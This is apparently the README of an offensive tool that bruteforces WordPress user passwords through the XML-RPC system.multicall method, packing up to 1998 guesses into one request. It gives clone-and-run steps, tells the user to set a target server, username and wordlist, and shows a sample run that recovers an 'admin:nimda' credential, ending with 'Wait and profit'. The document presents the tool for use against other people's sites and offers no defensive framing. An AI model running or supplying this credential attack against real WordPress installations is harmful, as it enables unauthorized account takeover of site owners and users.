# Purpose

This tool bruteforces user passwords on Wordpress installations that have XML-RPC enabled (by default, btw) using the `system.multicall()` call which allows encapsulation of multiple methods in one XML-RPC call, thus, giving an opportunity to save on network requests when bruteforcing passwords (amplification). In other words, instead of 1337 requests per 1337 password attempts, this methods allows for 1337 passwords to be tested in one request.

Currently, we have empirically established the maximum number of methods per request which is equal to 1998. Adding methods over this number produces an error on *our* Wordpress installation (YMMV).

# Usage
- `git clone https://github.com/0xBADCA7/wp-xmlrpc-bruteforcer.git`
- `cd wp-xmlrpc-bruteforcer`
- Edit `main.py`:
	-	`WORDPRESS_SERVER` to point to the `xmlrpc.php` file on the remote side
	- `USERNAME` for the username password of which you want to discover
	- `WORDLIST` to point to the dictionary of your choice
	- (optional) `CHUNK_SIZE` to change the number of multicall methods per single network request
	- (optional) `THREADS_NUM` to change the number of threads
- Run as `python3 main.py`
- Wait and profit

# Sample run
```
$ python3 main.py
[+] Started at Sun Nov  8 14:30:55 2015
[i] Thread-2 Total words:  256 Total calls:  1
[i] Thread-3 Total words:  256 Total calls:  1
[i] Thread-1 Total words:  256 Total calls:  1
[i] Thread-1 Total words:  512 Total calls:  2
[i] Thread-2 Total words:  512 Total calls:  2
[i] Thread-3 Total words:  512 Total calls:  2
[i] Thread-1 Total words:  768 Total calls:  3
[i] Thread-2 Total words:  768 Total calls:  3
[i] Thread-3 Total words:  768 Total calls:  3
[i] Thread-1 Total words:  1024 Total calls:  4
[i] Thread-2 Total words:  1024 Total calls:  4
[i] Thread-3 Total words:  1024 Total calls:  4
[i] Thread-1 Total words:  1280 Total calls:  5
[i] Thread-2 Total words:  1280 Total calls:  5
[i] Thread-3 Total words:  1280 Total calls:  5
[i] Thread-3 Total words:  1536 Total calls:  6
[i] Thread-2 Total words:  1536 Total calls:  6
[i] Thread-1 Total words:  1536 Total calls:  6
[i] Thread-2 Total words:  1792 Total calls:  7
[i] Thread-3 Total words:  1792 Total calls:  7
[i] Thread-1 Total words:  1792 Total calls:  7
[i] Thread-2 Total words:  2048 Total calls:  8
[i] Thread-1 Total words:  2048 Total calls:  8
[i] Thread-3 Total words:  2048 Total calls:  8
[i] Thread-2 Total words:  2304 Total calls:  9
[i] Thread-1 Total words:  2304 Total calls:  9
[i] Thread-3 Total words:  2304 Total calls:  9
[i] Thread-2 Total words:  2560 Total calls:  10
[i] Thread-1 Total words:  2560 Total calls:  10
[i] Thread-3 Total words:  2560 Total calls:  10
[i] Thread-2 Total words:  2816 Total calls:  11
[i] Thread-1 Total words:  2816 Total calls:  11
[i] Thread-3 Total words:  2816 Total calls:  11
[i] Thread-2 Total words:  3072 Total calls:  12
[i] Thread-1 Total words:  3072 Total calls:  12
[i] Thread-3 Total words:  3072 Total calls:  12
[i] Thread-2 Total words:  3328 Total calls:  13
[i] Thread-1 Total words:  3328 Total calls:  13
[!] Found a match: "admin:nimda"
[+] Finished at Sun Nov  8 14:32:16 2015
Password found. All done. Bye
```

# License
Licensed under GPLv3, see [gpl-3.0.txt](/wp-xmlrpc-bruteforcer/blob/master/gpl-3.0.txt) for details.


